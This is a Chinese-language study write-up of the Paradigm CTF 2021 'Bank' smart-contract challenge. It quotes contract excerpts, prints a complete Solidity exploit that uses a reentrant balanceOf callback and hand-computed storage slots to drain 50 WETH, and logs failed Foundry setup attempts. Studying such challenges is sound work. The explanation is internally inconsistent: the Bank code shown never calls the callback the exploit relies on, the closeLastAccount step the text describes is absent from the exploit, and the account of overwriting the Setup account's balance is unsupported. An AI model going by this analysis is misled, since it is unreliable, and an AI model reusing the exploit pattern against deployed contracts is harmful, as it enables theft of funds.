# Bank

本文为 Bank 题目的详细学习笔记，包含题目背景、合约逻辑、漏洞原理、官方Exploit逐行拆解、环境踩坑记录及学习总结，（注：本地复现因环境兼容性问题未完全跑通，重点聚焦原理理解与Exploit分析）。

## 一、题目基础信息

### 1\.1 题目

\- 题目模块：bank（private目录提供官方Exploit）

\- 合约版本：Solidity 0\.4\.24（老旧版本，与现代Foundry工具存在兼容性问题）

\- 核心目标：将Bank合约中存储的50 WETH全部取出，调用Setup合约的isSolved\(\)返回true即通关。

### 1\.2 题目文件结构

题目目录结构如下（重点关注public合约和private目录下的官方Exploit）：

```bash
paradigm-ctf-2021/bank/
├── public/          # 题目公开合约
│   ├── contracts/
│   │   ├── Bank.sol       # 核心银行合约
│   │   └── Setup.sol      # 题目部署合约（初始化50 WETH）
└── private/        
    └── Exploit.sol        # 核心分析对象
```

## 二、核心合约逻辑梳理

先明确3个核心合约的作用及关键逻辑，为理解漏洞和Exploit打下基础。

### 2\.1 Setup\.sol（题目部署合约）

核心功能：部署Bank合约，向Bank合约存入50 WETH，提供获取Bank和WETH地址的接口，以及通关验证接口。

```solidity
// 关键代码片段
contract Setup {
    Bank public bank;
    WETH9 public weth;

    constructor() public {
        weth = new WETH9();
        bank = new Bank();
        weth.deposit.value(50 ether)(); // 向WETH存入50 ETH，获得50 WETH
        weth.transfer(address(bank), 50 ether); // 将50 WETH转入Bank
    }

    // 通关验证：Bank中WETH余额为0即通关
    function isSolved() public view returns (bool) {
        return weth.balanceOf(address(bank)) == 0;
    }
}
```

### 2\.2 Bank\.sol（核心漏洞合约）

Bank合约支持多账户管理，用户可创建账户、存入/取出WETH、关闭账户，核心数据结构和关键方法如下：

```solidity
// 核心数据结构
struct Account {
    mapping(address => uint) balances; // 账户内各代币余额
    string name;                      // 账户名称
}

mapping(address => Account[]) public accounts; // 每个用户可拥有多个账户（数组存储）

// 关键方法
// 1. 存入代币（创建账户：若accountId等于当前账户数组长度，自动创建新账户）
function depositToken(uint accountId, address token, uint amount) public {
    if (accountId == accounts[msg.sender].length) {
        accounts[msg.sender].length++; // 自动创建新账户
    }
    ERC20Like(token).transferFrom(msg.sender, address(this), amount);
    accounts[msg.sender][accountId].balances[token] += amount;
}

// 2. 取出代币
function withdrawToken(uint accountId, address token, uint amount) public {
    require(accountId < accounts[msg.sender].length); // 校验账户存在
    require(accounts[msg.sender][accountId].balances[token] >= amount);
    
    accounts[msg.sender][accountId].balances[token] -= amount;
    ERC20Like(token).transfer(msg.sender, amount);
}

// 3. 关闭最后一个账户（仅能关闭自己的最后一个账户）
function closeLastAccount() public {
    require(accounts[msg.sender].length > 0);
    accounts[msg.sender].length--; // 仅减少数组长度，未清理mapping余额
}

// 4. 设置账户名称（关键：无权限校验，可任意设置自己名下账户的名称）
function setAccountName(uint accountId, string name) public {
    require(accountId < accounts[msg.sender].length);
    accounts[msg.sender][accountId].name = name;
}
```

Bank合约的核心设计看似正常，但存在致命的存储布局漏洞，为后续攻击埋下隐患。

## 三、漏洞原理深度解析

本题漏洞并非简单的逻辑漏洞（如数组越界、权限绕过），而是 **Solidity存储布局碰撞 \+ mapping数据残留 \+ 手动Slot计算**

### 3\.1 核心前提：Solidity存储布局规则

要理解漏洞，必须先掌握Solidity 0\.4\.24的存储布局核心规则（与新版本一致）：

- 存储以32字节（1个Slot）为单位，依次存储合约状态变量；

- mapping类型的存储位置：mapping的Slot = keccak256\(abi\.encodePacked\(key, mapping自身的Slot\)\)；

- 数组类型的存储：数组自身占1个Slot（存储数组长度），数组元素按顺序存储在 keccak256\(数组自身Slot\) 开始的连续Slot中；

- struct类型的存储：struct的每个成员按顺序存储在连续的Slot中（若成员不足32字节，会进行打包）。

### 3\.2 漏洞核心：存储碰撞 \+ mapping残留

结合Bank合约的存储结构和上述规则，漏洞核心有2点：

1. **mapping数据无法被删除**：Bank合约的closeLastAccount\(\)方法，仅减少accounts\[msg\.sender\]数组的长度（accounts\[msg\.sender\]\.length\-\-），但数组中存储的Account结构体（含balances mapping）并未被清理，mapping中的余额数据会永久残留。


2. **存储Slot可被手动计算并碰撞**：通过手动计算Bank合约中“账户余额”的存储Slot，构造特定的账户ID，使得攻击合约的账户存储Slot与Setup合约的账户存储Slot重合（存储碰撞），进而通过setAccountName\(\)方法覆盖Setup账户的余额mapping，实现无权限取款。
        

简单来说：攻击合约通过计算，找到Setup合约在Bank中账户的余额存储位置，然后“伪装”成该账户，通过修改账户名称（实际修改存储数据），将Setup账户的WETH余额转移到自己名下，最终取走全部50 WETH。

## 四、官方Exploit逐行拆解（private/Exploit\.sol）

官方Exploit仅48行代码，看似简洁，实则包含了完整的存储计算、回调利用、存储碰撞逻辑，下面逐行拆解（保留原代码结构，重点补充“为什么这么写”，帮你理清思路）：

```solidity
import "public/Setup.sol";

// 1. 伪造ERC20代币合约（用于触发Bank合约的balanceOf回调，创建账户）
contract BadToken is ERC20Like {
    mapping(address => uint) balances; // 模拟代币余额映射
    uint stage = 0; // 攻击阶段标记（控制回调流程）

    // 模拟ERC20 transfer方法（无实际意义，仅满足接口）
    function transfer(address dst, uint qty) public returns (bool) {
        balances[msg.sender] -= qty;
        balances[dst] += qty;
        return true;
    }

    // 模拟ERC20 transferFrom方法（无实际意义，仅满足接口）
    function transferFrom(address src, address dst, uint qty) public returns (bool) {
        balances[src] -= qty;
        balances[dst] += qty;
        return true;
    }

    // 模拟ERC20 approve方法（无实际意义，仅满足接口）
    function approve(address, uint) public returns (bool) {
        return true;
    }

    // 核心回调方法：Bank合约取款时会调用此方法查询余额
    // 利用回调触发Bank合约的账户创建和操作，无需手动调用
    function balanceOf(address who) public view returns (uint) {
        uint result = balances[who]; // 正常返回余额

        if (stage == 1) {
            stage = 2;
            // 阶段1：回调时创建攻击合约的账户0（存入0代币，仅创建账户）
            bank.depositToken(0, this, 0);
        } else if (stage == 2) {
            stage = 3;
            // 阶段2：回调时取出0代币（无实际操作，仅触发流程）
            bank.withdrawToken(0, this, 0);
        }

        return result;
    }

    // 引用Bank和WETH合约（攻击目标）
    Bank private bank;
    WETH9 private weth;

    // 2. 核心攻击函数（接收Setup合约地址，初始化攻击）
    function exploit(Setup setup) public {
        bank = setup.bank(); // 获取Bank合约地址
        weth = setup.weth(); // 获取WETH合约地址

        // 第一步：创建攻击合约在Bank中的第一个账户（账户0）
        bank.depositToken(0, this, 0);

        // 第二步：设置攻击阶段为1，调用取款方法触发balanceOf回调
        stage = 1;
        bank.withdrawToken(0, this, 0);

        // 第三步：手动计算存储Slot，构造存储碰撞
        // 计算攻击合约accounts数组的存储Slot（accounts是mapping(address => Account[])）
        // accounts自身的Slot为2（根据Bank合约状态变量顺序计算）
        bytes32 myArraySlot = keccak256(bytes32(address(this)), uint(2));
        // 计算accounts数组元素的起始Slot（数组元素存储在keccak256(数组自身Slot)）
        bytes32 myArrayStart = keccak256(myArraySlot);

        uint account = 0;
        uint slotsNeeded;
        // 循环计算，找到能与Setup账户存储Slot碰撞的账户ID
        while (true) {
            // 计算当前账户（account）的起始Slot（每个Account结构体占3个Slot）
            bytes32 account0Start = bytes32(uint(myArrayStart) + 3*account);
            // 计算当前账户的balances mapping的Slot（Account结构体中，balances是第二个成员，占1个Slot）
            bytes32 account0Balances = bytes32(uint(account0Start) + 2);
            // 计算当前账户中WETH的余额存储Slot（mapping(key=WETH地址, Slot=account0Balances)）
            bytes32 wethBalance = keccak256(bytes32(address(weth)), account0Balances);

            // 计算需要的Slot数量，判断是否满足碰撞条件（取模3等于0）
            slotsNeeded = (uint(-1) - uint(myArrayStart));
            slotsNeeded++;
            slotsNeeded += uint(wethBalance);
            if (uint(slotsNeeded) % 3 == 0) {
                break; // 找到目标账户ID，退出循环
            }
            account++;
        }

        // 第四步：计算目标账户ID（Setup合约在Bank中的账户）
        uint accountId = uint(slotsNeeded) / 3;

        // 第五步：存储碰撞核心操作——通过setAccountName覆盖Setup账户的余额映射
        // 构造恶意名称（31字节，用于覆盖存储数据），修改Setup账户的WETH余额
        bank.setAccountName(accountId, string(abi.encodePacked(bytes31(uint248(uint(-1))))));

        // 第六步：取出Bank中所有WETH（此时Setup账户的WETH余额已被覆盖到攻击合约名下）
        bank.withdrawToken(account, address(weth), weth.balanceOf(address(bank)));
    }
}

// 3. 攻击入口合约（构造函数接收Setup地址，自动触发攻击）
contract Exploit {
    constructor(Setup setup) public {
        new BadToken().exploit(setup); // 部署BadToken并执行攻击
    }
}
```

### 4\.1 Exploit核心流程总结

1. 部署BadToken（伪造ERC20代币）和Exploit（攻击入口）；

2. 利用BadToken的balanceOf回调，自动创建攻击合约在Bank中的账户；

3. 手动计算Bank合约的存储Slot，找到Setup合约在Bank中账户的存储位置；

4. 通过setAccountName\(\)方法覆盖Setup账户的WETH余额映射；

5. 取出Bank中全部50 WETH，完成攻击。

## 五、环境踩坑记录

本地复现过程中遇到多个环境兼容性问题，均为题目老旧（2021年）与现代工具（Foundry新版本）不兼容导致，非个人技术问题，记录如下，供后续学习者参考：

### 5\.1 踩坑1：Foundry命令不兼容

问题：执行forge compile \-\-solc\-version 0\.4\.24 \-\-via\-ir 报错，提示“unexpected argument \&\#39;\-\-solc\-version\&\#39;”。

原因：现代Foundry版本（2025年）已移除\-\-solc\-version参数，改用\-\-evm\-version指定版本，且对Solidity 0\.4\.24支持不完善。

解决尝试：使用forge build（默认编译），可正常编译合约，但部署时仍会报错。

### 5\.2 踩坑2：部署脚本不存在

问题：执行forge script script/Deploy\.s\.sol \-\-rpc\-url http://127\.0\.0\.1:8545 \-\-broadcast 报错，提示“contract source info format must be \&lt;path\&gt;:\&lt;contractname\&gt; or \&lt;contractname\&gt;”。

原因：题目未提供Deploy\.s\.sol部署脚本，本地环境未自动部署Setup和Bank合约，无法获取合约地址。

解决尝试：手动部署Setup合约（forge create public/contracts/Setup\.sol:Setup \-\-rpc\-url \.\.\.），但因合约版本老旧，部署时触发“execution reverted”报错，无法成功部署。

### 5\.3 踩坑3：RPC连接异常

问题：多次出现“URL拼写可能存在错误，请检查”报错，确认RPC地址（http://127\.0\.0\.1:8545）正确，但仍无法正常连接。

原因：Anvil节点未正常启动，或节点与Foundry版本不兼容，导致RPC连接失败。

解决尝试：重启Anvil节点（anvil），重新执行命令，部分情况下可恢复连接，但部署合约仍会报错。

### 5\.4 总结：复现失败的核心原因

Paradigm CTF 2021 Bank题目为2021年赛事题目，依赖Solidity 0\.4\.24和旧版本Foundry工具，而现代工具对老旧合约的支持不完善，且题目未提供完整的本地部署脚本，导致本地复现困难，属于环境问题。

## 六、Lessons Learned

### 6\.1 核心知识点

- 掌握Solidity存储布局核心规则（mapping、数组、struct的存储方式），理解Slot计算的核心逻辑；

- 理解“存储碰撞”攻击的原理的实现方式，掌握手动计算Slot的方法；

- 明确mapping类型的特性：一旦写入数据，无法被删除，仅修改数组长度无法清理mapping数据；

- 学会分析复杂合约的漏洞，从存储布局角度挖掘潜在攻击点（而非仅关注逻辑漏洞）。

### 6\.2 定位

本题考察的是Solidity底层存储知识，而非基础的逻辑漏洞，适合具备一定Solidity基础和存储布局理解的学习者研究。

### 6\.3 学习建议

- 对于无法本地复现的题目，重点聚焦原理理解和Exploit分析，将核心知识点整理成笔记，提升自身技术储备；

- 后续复现可尝试降级Foundry版本（适配Solidity 0\.4\.24），或使用在线CTF平台（如Etherscan Remix）部署合约，规避本地环境兼容性问题。

### 6\.4 补充说明

本文笔记重点在于“原理理解”和“Exploit解析”，具备实际的学习和参考价值。后续若解决环境兼容性问题，会补充复现步骤。

## 七、参考资料

- Paradigm CTF 2021 官方题目仓库

- Solidity官方文档 \- 存储布局：https://docs\.soliditylang\.org/en/v0\.4\.24/miscellaneous\.html\#layout\-of\-state\-variables\-in\-storage
